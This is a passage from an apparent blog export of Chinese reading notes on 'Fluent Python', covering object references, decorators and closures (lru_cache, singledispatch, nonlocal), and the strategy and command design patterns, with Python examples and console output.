编程有很多实际的影响。 简单的赋值不创建副本。 对 += 或 *= 所做的增量赋值来说，如果左边的变量绑定的是不可变对象，会创建新对象；如果是可变对象，会就地修改。 为现有的变量赋予新值，不会修改之前绑定的变量。这叫重新绑定：现在变量绑定了其他对象。如果变量是之前那个对象的最后一个引用，对象会被当作垃圾回收。 函数的参数以别名的形式传递，这意味着，函数可能会修改通过参数传入的可变对象。这一行为无法避免，除非在本地创建副本，或者使用不可变对象（例如，传入元组，而不传入列表）。 使用可变类型作为函数参数的默认值有危险，因为如果就地修改了参数，默认值也就变了，这会影响以后使用默认值的调用。]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>fluent python</tag>
        <tag>对象引用</tag>
        <tag>垃圾回收</tag>
        <tag>Mutability</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Fluent Python 第七章小结]]></title>
    <url>%2F2017%2F12%2F19%2Ffluent-python-7%2F</url>
    <content type="text"><![CDATA[Fluent Python 第七章读书报告 Chapter 7. Function Decorators and Closures第七章: 函数装饰器和函数闭包函数装饰器使用特殊的标记增强函数，要想掌握装饰器，首先要理解函数闭包。nonlocal 是在Python3 中引入的保留关键字，如果要使用函数闭包和装饰器，也必须要了解nonlocal。另外，闭包同时也是函数式编程和回调式异步编程的基础。这一张要讨论的话题:基础知识： python 计算装饰器句法 python 如何判断变量是否是局部的 闭包存在的原因和工作原理 nonlocal 可以解决的问题 进一步探讨装饰器: 实现行为良好的装饰器 标准库中有用的装饰器 实现参数化装饰器 装饰器基础知识装饰器是一个可调用的对象，它的参数是另一个函数（被装饰的函数），装饰器可能会将输入的函数进行处理返回结果，或者将其替换成另一个函数或者可调用对象。下面是一个例子, 假设有一个名为decorate的装饰器: 12345@decoratedef target(): print('running target()') # 等价于下面的写法target = decorate(target()) 上述两段代码得到的target函数都是经过decrate处理过的, 下面的控制台会话证明了这点: 12345678910111213&gt;&gt;&gt; def deco(func):... def inner():... print('running inner()')... return inner...&gt;&gt;&gt; @deco... def target():... print('running target()')...&gt;&gt;&gt; target()running inner()&gt;&gt;&gt; target&lt;function deco.&lt;locals&gt;.inner at 0x10063b598&gt; 可以看到target 已经被替换成了inner,严格来说target现在是inner的引用。 Python何时执行装饰器装饰器的一大特性是，能把被装饰的函数替换成其他函数，第二个特性是装饰器加载模块时会立即执行。第二个特性看可以看看下面这个例子: 12345678910111213141516171819202122registry = []def register(func): print('running register(%s)' % func) registry.append(func) return func@registerdef f1(): print('running f1()')@registerdef f2(): print('running f2()')def f3(): print('running f3()')def main(): print('running main()') print('registry -&gt;', registry) f1() f2() f3()if __name__=='__main__': main() 控制台输出如下: 1234567running register(&lt;function f1 at 0x10320eb70&gt;)running register(&lt;function f2 at 0x10320eae8&gt;)running main()registry -&gt; [&lt;function f1 at 0x10320eb70&gt;, &lt;function f2 at 0x10320eae8&gt;]running f1()running f2()running f3() 如果是导入:12345&gt;&gt;&gt; import registerationrunning register(&lt;function f1 at 0x1100480d0&gt;)running register(&lt;function f2 at 0x110048158&gt;)&gt;&gt;&gt; registeration.registry[&lt;function f1 at 0x1100480d0&gt;, &lt;function f2 at 0x110048158&gt;] 上面的例子可以看出：函数装饰器在导入模块时立即执行，而被装饰的函数只在明确调用时运行。这突出了 Python 的导入时和运行时之间的区别。 这里提到装饰器的通常用法和registeration.py中的不同: 例子中的装饰器函数与被装饰的函数在同一个模块中定义。实际情况是，装饰器通常在一个模块中定义，然后应用到其他模块中的函数上。 例子中的 register 使用装饰器改进策略模式在使用一等对象的特性实现策略模式时，曾经说过，当时的实现有一些问题，就是如何方便的遍历所有的策略以获取最佳的折扣，现在我们可以使用装饰器很好的解决这个问题。 1234567891011121314151617181920212223242526promos = []def promotion(promo_func): promos.append(promo_func) return promo_func@promotiondef fidelity(order): """为积分为1000或以上的顾客提供5%折扣""" return order.total() * .05 if order.customer.fidelity &gt;= 1000 else 0@promotion def bulk_item(order): """单个商品为20个或以上时提供10%折扣""" discount = 0 for item in order.cart: if item.quantity &gt;= 20: discount += item.total() * .1 return discount@promotiondef large_order(order): """订单中的不同商品达到10个或以上时提供7%折扣""" distinct_items = &#123;item.product for item in order.cart&#125; if len(distinct_items) &gt;= 10: return order.total() * .07 return 0def best_promo(order): """选择可用的最佳折扣""" return max(promo(order) for promo in promos) 这样做的好处有: 策略函数无须使用特殊的名称作区分 @promotion 装饰器既可以增加策略，也可以方便禁用策略（注释掉装饰器即可） 策略函数可以在任何地方定义，只需要使用@promotion装饰器 多数装饰器会修改被装饰的函数。通常，它们会定义一个内部函数，然后将其返回，替换被装饰的函数。使用内部函数的代码几乎都要靠闭包才能正确运作。为了理解闭包，我们要先了解 Python 中的变量作用域。 Python中变量的作用域下面的一系列控制台交互可以让我们更加了解Python的变量作用域： 12345678910&gt;&gt;&gt; def f1(a):... print(a)... print(b)...&gt;&gt;&gt; f1(3)3Traceback (most recent call last): File "&lt;stdin&gt;", line 1, in &lt;module&gt; File "&lt;stdin&gt;", line 3, in f1NameError: name 'b' is not defined 这个例子中由于没有定义全局变量b导致报错 1234&gt;&gt;&gt; b = 6&gt;&gt;&gt; f1(3)36 这里定义了全局变量b,正常运行 123456789101112&gt;&gt;&gt; def f2(a):... print(a)... print(b)... b = 6...&gt;&gt;&gt; b = 3&gt;&gt;&gt; f2(3)3Traceback (most recent call last): File "&lt;stdin&gt;", line 1, in &lt;module&gt; File "&lt;stdin&gt;", line 3, in f2UnboundLocalError: local variable 'b' referenced before assignment 这里由于函数f2的定义体中给b赋值了，导致f2判断b是局部变量。 这里我们可以看到Python对变量的一个设计: Python 不要求声明变量，但是假定在函数定义体中赋值的变量是局部变量。这样的好处是可以防止在不知情的情况下使用全局变量。如果也要在函数定义体中对全局变量赋值，只需要用global声明： 12345678910111213&gt;&gt;&gt; def f3(a):... global b... print(a)... print(b)... b = 6...&gt;&gt;&gt; b = 3&gt;&gt;&gt; f3(b)33&gt;&gt;&gt; b6&gt;&gt;&gt; 为了深入理解一下f1/f2这两个函数的变量加载方式，可以使用dis模块反汇编，查看字节码： 1234567891011121314151617181920212223242526272829&gt;&gt;&gt; dis(f1) 2 0 LOAD_GLOBAL 0 (print) 2 LOAD_FAST 0 (a) 4 CALL_FUNCTION 1 6 POP_TOP 3 8 LOAD_GLOBAL 0 (print) 10 LOAD_GLOBAL 1 (b) #全局变量 12 CALL_FUNCTION 1 14 POP_TOP 16 LOAD_CONST 0 (None) 18 RETURN_VALUESyntaxError: invalid syntax&gt;&gt;&gt; dis(f2) 2 0 LOAD_GLOBAL 0 (print) 2 LOAD_FAST 0 (a) 4 CALL_FUNCTION 1 6 POP_TOP 3 8 LOAD_GLOBAL 0 (print) 10 LOAD_FAST 1 (b) #局部变量 12 CALL_FUNCTION 1 14 POP_TOP 4 16 LOAD_CONST 1 (6) 18 STORE_FAST 1 (b) 20 LOAD_CONST 0 (None) 22 RETURN_VALUE 7.5 闭包闭包指延伸了作用域的函数，其中包含函数定义体中引用、但是不在定义体中定义的非全局变量。函数是不是匿名的没有关系，关键是它能访问定义体之外定义的非全局变量。这个概念非常抽象，我们通过一个例子更好地理解它: 假如有个名为 avg 的函数，它的作用是计算不断增加的系列值的均值；例如，整个历史中某个商品的平均收盘价。每天都会增加新价格，因此平均值要考虑至目前为止所有的价格。 首先看看这个函数的面对对象实现: 1234567class Averager(): def __init__(self): self.series = [] def __call__(self, new_value): self.series.append(new_value) total = sum(self.series) return total/len(self.series) 其中Averager()是一个可调用对象，创建Averager的实例就可以达成上面所说的要求。 >>> avg = Averager()>>> avg(10)10.0>>> avg(11)10.5>>> avg(12)11.0 接下来是函数式实现，使用高阶函数make_averager: 1234567def make_averager(): series = [] def averager(new_value): series.append(new_value) total = sum(series) return total/len(series) return averager >>> avg = make_averager()>>> avg(10) 10.0>>> avg(11) 10.5>>> avg(12) 11.0 这两个示例的相同点: 都是通过更新历史值再进行平均值计算。问题在于数据的存储，面对对象实现是存储在实例属性self.series中的，而make_averager是存储在series中的。 这里需要注意的地方是，在 avg = make_averager() 这句执行以后，make_averager函数已经返回了，这时series的本地作用域已经不存在了。 而在averager中，series是自由变量（free variable）,指未在本地作用域中绑定的变量。 接下来审查averager对象，我们发现Python在__code__属性中保存局部变量和自由变量的名称。 1234567&gt;&gt;&gt; from averager import make_averager&gt;&gt;&gt;&gt;&gt;&gt; avg = make_averager()&gt;&gt;&gt; avg.__code__.co_varnames('new_value', 'total')&gt;&gt;&gt; avg.__code__.co_freevars('series',) series 绑定在 avg.__closure__属性中 1234567891011121314&gt;&gt;&gt; avg.__closure__[0].cell_contents[]&gt;&gt;&gt; avg(10)10.0&gt;&gt;&gt; avg.__closure__[0].cell_contents[10]&gt;&gt;&gt; avg(11)10.5&gt;&gt;&gt; avg.__closure__[0].cell_contents[10, 11]&gt;&gt;&gt; avg(13)11.333333333333334&gt;&gt;&gt; avg.__closure__[0].cell_contents[10, 11, 13] 这样我们可以很形象的理解闭包的性质了，闭包是一种函数，它会保留定义函数时存在的自由变量的绑定，这样调用函数时，虽然定义作用域不可用了，但是仍能使用那些绑定。 只有嵌套在其他函数中的函数才可能需要处理不在全局作用域中的外部变量，这也是匿名函数容易和闭包混淆的一个原因。 nonlocal声明前面实现的make_averager函数的效率并不高，因为每次调用avg都要对所有历史值求和，实际上只需要当前值+历史值的和就可以了。接下来我们尝试对代码进行一些优化: 12345678def make_averager_v1(): count = 0 total = 0 def averager(new_value): count += 1 total += new_value return total / count return averager 控制台输出如下:123456789&gt;&gt;&gt; from averager import make_averager_v1&gt;&gt;&gt; avg = make_averager_v1()&gt;&gt;&gt; avg(10)Traceback (most recent call last): File "&lt;stdin&gt;", line 1, in &lt;module&gt; File "/Users/NickAl/study/github/readings/Fluent-Python/7. Function Decorators and Closures/averager.py", line 13, in averager count += 1UnboundLocalError: local variable 'count' referenced before assignment&gt;&gt;&gt; 由于函数的定义体对count赋值了，由于count是int,赋值会隐式的创建一个新对象，导致函数判断count是局部变量而不是自由变量，不会保存在闭包中，会导致抛出异常。 Python3 中的nonlocal声明会把变量标记为自由变量，使得变量可以保存在闭包中。下面利用nonlocal对上面的代码进行修正： 123456789def make_averager_v1(): count = 0 total = 0 def averager(new_value): nonlocal count, total count += 1 total += new_value return total / count return averager 在没有nonlocal声明的Python2中，我们可以将变量作为值存储在可变对象中来解决这个问题。 实现一个简单的装饰器下面是一个简单的装饰器，输出函数的运行时间, clocked是一个闭包，func是自由变量。 1234567891011import timedef clock(func): def clocked(*args): t0 = time.perf_counter() result = func(*args) elapsed = time.perf_counter() - t0 name = func.__name__ arg_str = ', '.join(repr(arg) for arg in args) print('[%0.8fs] %s(%s) -&gt; %r' % (elapsed, name, arg_str, result)) return result return clocked 下面的Python代码展示了如何使用这个装饰器: 1234567891011121314# clockdeco_demo.pyimport timefrom clockdeco import clock@clockdef snooze(seconds): time.sleep(seconds)@clockdef factorial(n): return 1 if n &lt; 2 else n*factorial(n-1)if __name__=='__main__': print('*' * 40, 'Calling snooze(.123)') snooze(.123) print('*' * 40, 'Calling factorial(6)') print('6! =', factorial(6)) 输出如下: -&gt; % python3 clockdeco_demo.py** Calling snooze(.123)[0.12309374s] snooze(0.123) -&gt; None** Calling factorial(6)[0.00000162s] factorial(1) -&gt; 1[0.00003553s] factorial(2) -&gt; 2[0.00005951s] factorial(3) -&gt; 6[0.00008194s] factorial(4) -&gt; 24[0.00010441s] factorial(5) -&gt; 120[0.00013048s] factorial(6) -&gt; 7206! = 720 这个例子中，clocked参数做了如下操作:(1) 记录初始时间 t0。(2) 调用原来的 factorial 函数，保存结果。(3) 计算经过的时间。(4) 格式化收集的数据，然后打印出来。(5) 返回第 2 步保存的结果。这是装饰器的典型行为：把被装饰的函数替换成新函数，二者接受相同的参数，而且（通常）返回被装饰的函数本该返回的值，同时还会做些额外操作。 上面的装饰器还存在一些问题: 不支持关键字参数 遮盖了被装饰的函数的__name__和__doc__属性 下面的示例解决了这个问题： 1234567891011121314151617181920#clockdeco2.pyimport timeimport functoolsdef clock(func): @functools.wraps(func) def clocked(*args, **kwargs): t0 = time.time() result = func(*args, **kwargs) elapsed = time.time() - t0 name = func.__name__ arg_lst = [] if args: arg_lst.append(', '.join(repr(arg) for arg in args)) if kwargs: pairs = ['%s=%r' % (k, w) for k, w in sorted(kwargs.items())] arg_lst.append(', '.join(pairs)) arg_str = ', '.join(arg_lst) print('[%0.8fs] %s(%s) -&gt; %r ' % (elapsed, name, arg_str, result)) return result return clocked functool.wrap是标准库中可以直接取用的装饰器。 标准库中的装饰器这节会讲到functool中的两个值得关注的装饰器: lru_cache和single_dispatch 使用functools.lru_cache做备忘functools.lru_cache 是非常实用的装饰器，它实现了备忘（memoization）功能。这是一项优化技术，它把耗时的函数的结果保存起来，避免传入相同的参数时重复计算。LRU三个字母是“Least Recently Used”的缩写，表明缓存不会无限制增长，一段时间不用的缓存条目会被扔掉。生成第 n 个斐波纳契数这种慢速递归函数适合使用 lru_cache，下面的代码是一个示例 12345678from clockdeco import clock@clockdef fibonacci(n): if n &lt; 2: return n return fibonacci(n-2) + fibonacci(n-1)if __name__=='__main__': print(fibonacci(6)) 输出如下： -&gt; % python3 fibo_demo.py[0.00000075s] fibonacci(0) -&gt; 0[0.00000106s] fibonacci(1) -&gt; 1[0.00008829s] fibonacci(2) -&gt; 1[0.00000052s] fibonacci(1) -&gt; 1[0.00000056s] fibonacci(0) -&gt; 0[0.00000068s] fibonacci(1) -&gt; 1[0.00002681s] fibonacci(2) -&gt; 1[0.00005140s] fibonacci(3) -&gt; 2[0.00016751s] fibonacci(4) -&gt; 3[0.00000051s] fibonacci(1) -&gt; 1[0.00000046s] fibonacci(0) -&gt; 0[0.00000054s] fibonacci(1) -&gt; 1[0.00002430s] fibonacci(2) -&gt; 1[0.00005003s] fibonacci(3) -&gt; 2[0.00000054s] fibonacci(0) -&gt; 0[0.00000057s] fibonacci(1) -&gt; 1[0.00002484s] fibonacci(2) -&gt; 1[0.00000044s] fibonacci(1) -&gt; 1[0.00000081s] fibonacci(0) -&gt; 0[0.00000073s] fibonacci(1) -&gt; 1[0.00002765s] fibonacci(2) -&gt; 1[0.00005353s] fibonacci(3) -&gt; 2[0.00010212s] fibonacci(4) -&gt; 3[0.00017658s] fibonacci(5) -&gt; 5[0.00037021s] fibonacci(6) -&gt; 8 8 可以看到低阶的部分不断的被运算，非常浪费时间，下面是利用缓存优化后的代码: 12345678910import functoolsfrom clockdeco import clock@functools.lru_cache()@clockdef fibonacci(n): if n &lt; 2: return n return fibonacci(n-2) + fibonacci(n-1)if __name__=='__main__': print(fibonacci(6)) 控制台输出: -&gt; % python3 fibo_demo.py[0.00000114s] fibonacci(0) -&gt; 0[0.00000152s] fibonacci(1) -&gt; 1[0.00014005s] fibonacci(2) -&gt; 1[0.00000173s] fibonacci(3) -&gt; 2[0.00018128s] fibonacci(4) -&gt; 3[0.00000119s] fibonacci(5) -&gt; 5[0.00022029s] fibonacci(6) -&gt; 8 8 这里要注意的两点是:lru_cache必须向常规函数一样被调用，而是装饰器是可以叠加的。上面的例子告诉我们lru_cache在优化递归缓存方面的巨大用途，其实它在Web应用中也能起到很大的用处 functools.lru_cache(maxsize=128, typed=False) 上面可以看出functools.lru_cache接收两个参数，maxsize和typed。 maxsize指定存储结果的数量，缓存满了之后，旧的结果会被丢掉，一般为了性能考虑，这个值设为2的幂。 typed是否区分不同类型的结果（如浮点数和整数） 同时lru_cache要求被传入的函数的参数是可散列的。 7.8.2 单分派泛函数 Python中经常会困扰我们的问题是:没有switch语句，如何处理多条件的问题。用多个if/elif/else组合可以解决这个问题，但有时候这样做的代码过于冗杂难以阅读。 single_dispatch装饰器就是被用来处理这种问题的。使用 @singledispatch 装饰的普通函数会变成泛函数（generic function）：根据第一个参数的类型，以不同方式执行相同操作的一组函数。 下面的例子展示了一个根据参数类型不同生成不同的Html的场景 1234567891011121314151617181920from functools import singledispatchfrom collections import abcimport numbersimport html@singledispatchdef htmlize(obj): content = html.escape(repr(obj)) return '&lt;pre&gt;&#123;&#125;&lt;/pre&gt;'.format(content)@htmlize.register(str)def _(text): content = html.escape(text).replace('\n', '&lt;br&gt;\n') return '&lt;p&gt;&#123;0&#125;&lt;/p&gt;'.format(content)@htmlize.register(numbers.Integral)def _(n): return '&lt;pre&gt;&#123;0&#125; (0x&#123;0:x&#125;)&lt;/pre&gt;'.format(n)@htmlize.register(tuple)@htmlize.register(abc.MutableSequence)def _(seq): inner = '&lt;/li&gt;\n&lt;li&gt;'.join(htmlize(item) for item in seq) return '&lt;ul&gt;\n&lt;li&gt;' + inner + '&lt;/li&gt;\n&lt;/ul&gt;' 注册的专门函数应该尽可能处理抽象基类（如 numbers.Integral 和abc.MutableSequence），不要处理具体实现（如 int 和 list）。这样，代码支持的兼容类型更广泛。例如，Python 扩展可以子类化 numbers.Integral，使用固定的位数实现 int 类型。 single dispatch 类似重载，但绝不是为了把 Java 的那种方法重载带入 Python。 7.9 参数化装饰器Python 把被装饰的函数作为第一个参数传给装饰器函数。那怎么让装饰器接受其他参数呢？答案是：创建一个装饰器工厂函数，把参数传给它，返回一个装饰器，然后再把它应用到要装饰的函数上。 下面依次讲解上文中出现过的装饰器的参数化: 参数化的registeration为了便于启用或禁用 register 执行的函数注册功能，我们为它提供一个可选的 active参数，设为 False 时，不注册被装饰的函数。123456789101112131415161718registry = set()def register(active=True): def decorate(func): print('running register(active=%s)-&gt;decorate(%s)'% (active, func)) if active: registry.add(func) else: registry.discard(func) return func return decorate@register(active=False)def f1(): print('running f1()')@register()def f2(): print('running f2()')def f3(): print('running f3()') 这里的关键是，register() 要返回 decorate，然后把它应用到被装饰的函数上。这只是一个最简单的例子，参数化装饰器通常会把被装饰的函数替换掉，而且结构上需要多一层嵌套。接下来会探讨这种函数金字塔。 参数化clock装饰器我们需要对clock装饰器添加一个功能：让用户传入一个格式字符串，控制被装饰函数的输出。 123456789101112131415161718192021import timeDEFAULT_FMT = '[&#123;elapsed:0.8f&#125;s] &#123;name&#125;(&#123;args&#125;) -&gt; &#123;result&#125;'def clock(fmt=DEFAULT_FMT): #参数化的装饰器工厂函数 def decorate(func): #真正的装饰器 def clocked(*_args):#包装函数的函数 t0 = time.time() _result = func(*_args) elapsed = time.time() - t0 name = func.__name__ args = ', '.join(repr(arg) for arg in _args) result = repr(_result) print(fmt.format(**locals())) return _result return clocked return decorate if __name__ == '__main__': @clock() def snooze(seconds): time.sleep(seconds) for i in range(3): snooze(.123) 小结这章开始已经进入元编程领域了。参数化装饰器基本上都涉及至少两层嵌套函数，如果想使用 @functools.wraps 生成装饰器，为高级技术提供更好的支持，嵌套层级可能还会更深，比如前面简要介绍过的叠放装饰器。若想真正理解装饰器，需要区分导入时和运行时，还要知道变量作用域、闭包和新增的nonlocal 声明。掌握闭包和 nonlocal 不仅对构建装饰器有帮助，还能协助你在构建GUI 程序时面向事件编程，或者使用回调处理异步 I/O。]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>fluent python</tag>
        <tag>decorator</tag>
        <tag>closure</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Fluent Python第六章:使用一等函数实现设计模式(2) —— 命令模式]]></title>
    <url>%2F2017%2F12%2F19%2Ffluent-python-6-2%2F</url>
    <content type="text"><![CDATA[Fluent Python 第六章读书报告-第二部分 Chapter 6. Design Patterns with First-Class Functions第六章. 使用一等函数实现设计模式(2) —— 命令模式这一章中会讲到设计模式的定义和适用场景，以及利用Python的一等函数特性对设计模式的实现。 这篇博文中讨论命令模式。 命令模式 上面的UML类图所描述的场景是”菜单驱动的文本编辑器”,使用命令模式实现。各个命令可以有不同的接收者（实现操作的对象）。对 PasteCommand 来说，接收者是Document。对 OpenCommand 来说，接收者是应用程序。 命令模式的目的是解耦调用操作的对象（调用者）和提供实现的对象（接收者）。在上面所举的示例中，调用者是图形应用程序中的菜单项，而接收者是被编辑的文档或应用程序自身。 这个模式的做法是，在二者之间放一个 Command 对象，让它实现只有一个方法（execute）的接口，调用接收者中的方法执行所需的操作。这样，调用者无需了解接收者的接口，而且不同的接收者可以适应不同的 Command 子类。调用者有一个具体的命令，通过调用 execute 方法执行。注意，UML图中的 MacroCommand 可能保存一系列命令，它的 execute() 方法会在各个命令上调用相同的方法。 如何利用Python的一等对象性质对这个设计模式进行优化呢？之前讲到策略模式时我们提到过: 使用函数代替没有状态的类的对象 这样我们可以不为调用者提供Command对象，而是提供一个函数command。调用者不用调用command.excute(),使用command()就行。而MacroCommand可以实现成可调用的对象(实现__call__方法)，维护一个函数列表供以后调用。 1234567class MacroCommand: """一个执行一组命令的命令""" def __init__(self, commands): self.commands = list(commands) def __call__(self): for command in self.commands: command() 如果需要支持撤销操作(命令模式的定义中要求支持), 上面的代码可能远远不够，这时也可以使用Python提供的一些替代品: 为上面的可调用示例添加属性来保存状态 使用函数闭包在调用之间保存函数的内部状态 这里采用的方式与“策略”模式所用的类似：把实现单方法接口的类的实例替换成可调用对象。毕竟，每个Python 可调用对象都实现了单方法接口，这个方法就是 call。 总结通过对策略模式和命令模式的实现，我们看到了Python的一等对象特性的使用方式: 设计模式或API 要求组件实现单方法接口，而那个方法的名称很宽泛，例如“execute”“run”或“doIt”。在 Python 中，这些模式或 API 通常可以使用一等函数或其他可调用的对象实现，从而减少样板(重复的)代码。 关于Python语言的设计模式读物在阅读本章之前，我也去找过设计模式相关书籍，基本都是使用Java/C#实现的，Python相关的设计模式书籍确实乏善可陈。Fluent-Python推荐的设计模式读物: 《Python Cookbook（第 3 版）中文版》（David Beazley 和 Brian K. Jones 著）的“8.21 实现访问者模式”使用优雅的方式实现了“访问者”模式，其中的 NodeVisitor 类把方法当作一等对象处理。 Learning Python Design Patterns（Gennadiy Zlobin 著，Packt 出版社） 《Python 高级编程》（Tarek Ziadé著）是市面上最好的 Python 中级书，第 14 章“有用的设计模式”从 Python 程序员的视角介绍了 7 种经典模式。 Failed Project: Python 3 Patterns,Recipes and Idioms(Last updated 2015-08-04) 《Head First 设计模式》(这本我买了。。。。围绕Java讲的) 《Ruby 设计模式》（Russ Olsen 著）一书有很多见解也适用于 Python。 《设计模式：可复用面向对象软件的基础》一书是必读的。光是“引言”就值回书钱了(书里这么写的)]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>fluent python</tag>
        <tag>design pattern</tag>
        <tag>The Command pattern</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Fluent Python第六章:使用一等函数实现设计模式(1) —— 策略模式]]></title>
    <url>%2F2017%2F12%2F17%2Ffluent-python-6-1%2F</url>
    <content type="text"><![CDATA[Fluent Python 第六章读书报告-第一部分 Chapter 6. Design Patterns with First-Class Functions第六章. 使用一等函数实现设计模式(1) —— 策略模式这一章中会讲到设计模式的定义和适用场景，以及利用Python的一等函数特性对设计模式的实现。 这篇博文中先讨论策略模式。 策略模式合理利用作为一等函数的对象可以简化某些设计模式。 经典的策略模式《设计模式：可复用面向对象软件的基础》一书是这样概述“策略”模式的： 定义一系列算法，把它们一一封装起来，并且使它们可以相互替换。本模式使得算法可以独立于使用它的客户而变化。 策略模式的一个经典的场景是商店的折扣策略，上图是这个场景的UML类图。具体场景如下: 假如一个网店制定了下述折扣规则: 有 1000 或以上积分的顾客，每个订单享 5% 折扣。 同一订单中，单个商品的数量达到 20 个或以上，享 10% 折扣。 订单中的不同商品达到 10 个或以上，享 7% 折扣。简单起见，我们假定一个订单一次只能享用一个折扣。 上面的UML图中: 上下文: 把一些计算委托给实现不同算法的可互换组件，提供服务。在这个电商示例中，上下文是 Order，它会根据不同的算法计算促销折扣。 策略:实现不同算法的组件共同的接口。在这个示例中，名为 Promotion 的抽象类扮演这个角色。 具体策略: “策略”的子类，fidelityPromo、BulkPromo 和LargeOrderPromo 是这里实现的三个具体策略。 上面的UML类图中，每个具体策略都是一个类，而且都只定义了一个方法，即 discount。此外，策略实例没有状态（没有实例属性）。下面是使用Python对这个策略的重构，包括把具体策略用函数实现(而不是类)，取消了Promotion抽象类。示例6.1 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#coding=utf8from abc import ABC, abstractmethodfrom collections import namedtupleCustomer = namedtuple('Customer', 'name fidelity')class LineItem: def __init__(self, product, quantity, price): self.product = product self.quantity = quantity self.price = price def total(self): return self.price * self.quantityclass Order: # 上下文 def __init__(self, customer, cart, promotion=None): self.customer = customer self.cart = list(cart) self.promotion = promotion def total(self): if not hasattr(self, '__total'): self.__total = sum(item.total() for item in self.cart) return self.__total def due(self): if self.promotion is None: discount = 0 else: discount = self.promotion.discount(self) return self.total() - discount def __repr__(self): fmt = '&lt;Order total: &#123;:.2f&#125; due: &#123;:.2f&#125;&gt;' return fmt.format(self.total(), self.due())class Promotion(ABC) : # 策略：抽象基类 @abstractmethod def discount(self, order): """返回折扣金额（正值）""" class FidelityPromo(Promotion): # 第一个具体策略 """为积分为1000或以上的顾客提供5%折扣""" def discount(self, order): return order.total() * .05 if order.customer.fidelity &gt;= 1000 else 0class BulkItemPromo(Promotion): # 第二个具体策略 """单个商品为20个或以上时提供10%折扣""" def discount(self, order): discount = 0 for item in order.cart: if item.quantity &gt;= 20: discount += item.total() * .1 return discountclass LargeOrderPromo(Promotion): # 第三个具体策略 """订单中的不同商品达到10个或以上时提供7%折扣""" def discount(self, order): distinct_items = &#123;item.product for item in order.cart&#125; if len(distinct_items) &gt;= 10: return order.total() * .07 return 0 在这个示例中 Promotion是抽象基类(ABC)，这么做是为了使用@abstractmethod装饰器，从而明确表明所用的模式。 下面是使用不同出小折扣的Order类示例: 12345678910111213141516171819&gt;&gt;&gt; joe = Customer('John Doe', 0)&gt;&gt;&gt; ann = Customer('Ann Smith', 1100)&gt;&gt;&gt; cart = [LineItem('banana', 4, .5),... LineItem('apple', 10, 1.5),... LineItem('watermellon', 5, 5.0)]&gt;&gt;&gt; Order(joe, cart, FidelityPromo())&lt;Order total: 42.00 due: 42.00&gt;&gt;&gt;&gt; Order(ann, cart, FidelityPromo())&lt;Order total: 42.00 due: 39.90&gt;&gt;&gt;&gt; banana_cart = [LineItem('banana', 30, .5),... LineItem('apple', 10, 1.5)]&gt;&gt;&gt; Order(joe, banana_cart, BulkItemPromo())&lt;Order total: 30.00 due: 28.50&gt;&gt;&gt;&gt; long_order = [LineItem(str(item_code), 1, 1.0)... for item_code in range(10)]&gt;&gt;&gt; Order(joe, long_order, LargeOrderPromo())&lt;Order total: 10.00 due: 9.30&gt;&gt;&gt;&gt; Order(joe, cart, LargeOrderPromo())&lt;Order total: 42.00 due: 42.00&gt; 使用函数实现策略模式上面的经典实现中，每个策略是一个类，而且都只定义了一个方法discount, 此外它们都没有实例属性，因此可以用普通函数替换。下面是使用函数的一种实现。示例6.3 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#coding:utf-8from collections import namedtupleCustomer = namedtuple('Customer', 'name fidelity')class LineItem: def __init__(self, product, quantity, price): self.product = product self.quantity = quantity self.price = price def total(self): return self.price * self.quantityclass Order: # 上下文 def __init__(self, customer, cart, promotion=None): self.customer = customer self.cart = list(cart) self.promotion = promotion def total(self): if not hasattr(self, '__total'): self.__total = sum(item.total() for item in self.cart) return self.__total def due(self): if self.promotion is None: discount = 0 else: discount = self.promotion(self) return self.total() - discount def __repr__(self): fmt = '&lt;Order total: &#123;:.2f&#125; due: &#123;:.2f&#125;&gt;' return fmt.format(self.total(), self.due())def fidelity_promo(order): """为积分为1000或以上的顾客提供5%折扣""" return order.total() * .05 if order.customer.fidelity &gt;= 1000 else 0def bulk_item_promo(order): """单个商品为20个或以上时提供10%折扣""" discount = 0 for item in order.cart: if item.quantity &gt;= 20: discount += item.total() * .1 return discountdef large_order_promo(order): """订单中的不同商品达到10个或以上时提供7%折扣""" distinct_items = &#123;item.product for item in order.cart&#125; if len(distinct_items) &gt;= 10: return order.total() * .07 return 0 这个实例中没有抽象类，而且各个策略都是函数。下面是实际使用的输出: 12345678910111213141516171819&gt;&gt;&gt; joe = Customer('John Doe', 0)&gt;&gt;&gt; ann = Customer('Ann Smith', 1100)&gt;&gt;&gt; cart = [LineItem('banana', 4, .5),... LineItem('apple', 10, 1.5),... LineItem('watermellon', 5, 5.0)]&gt;&gt;&gt; Order(joe, cart, fidelity_promo)&lt;Order total: 42.00 due: 42.00&gt;&gt;&gt;&gt; Order(ann, cart, fidelity_promo)&lt;Order total: 42.00 due: 39.90&gt;&gt;&gt;&gt; banana_cart = [LineItem('banana', 30, .5),... LineItem('apple', 10, 1.5)]&gt;&gt;&gt; Order(joe, banana_cart, bulk_item_promo)&lt;Order total: 30.00 due: 28.50&gt;&gt;&gt;&gt; long_order = [LineItem(str(item_code), 1, 1.0)... for item_code in range(10)]&gt;&gt;&gt; Order(joe, long_order, large_order_promo)&lt;Order total: 10.00 due: 9.30&gt;&gt;&gt;&gt; Order(joe, cart, large_order_promo)&lt;Order total: 42.00 due: 42.00&gt; 可以看到应用对应的详细策略只需要将函数作为参数传入Order类，没必要像6.1一样实例化策略对象，这样会使得资源有所节省。 《设计模式：可复用面向对象软件的基础》一书的作者指出：“策略对象通常是很好的享元（flyweight）。” 那本书的另一部分对“享元”下了定义：“享元是可共享的对象，可以同时在多个上下文中使用。” 共享是推荐的做法，这样不必在每个新的上下文（这里是 Order 实例）中使用相同的策略时不断新建具体策略对象，从而减少消耗。因此，为了避免“策略”模式的一个缺点（运行时消耗），《设计模式：可复用面向对象软件的基础》的作者建议再使用另一个模式。但此时，代码行数和维护成本会不断攀升。 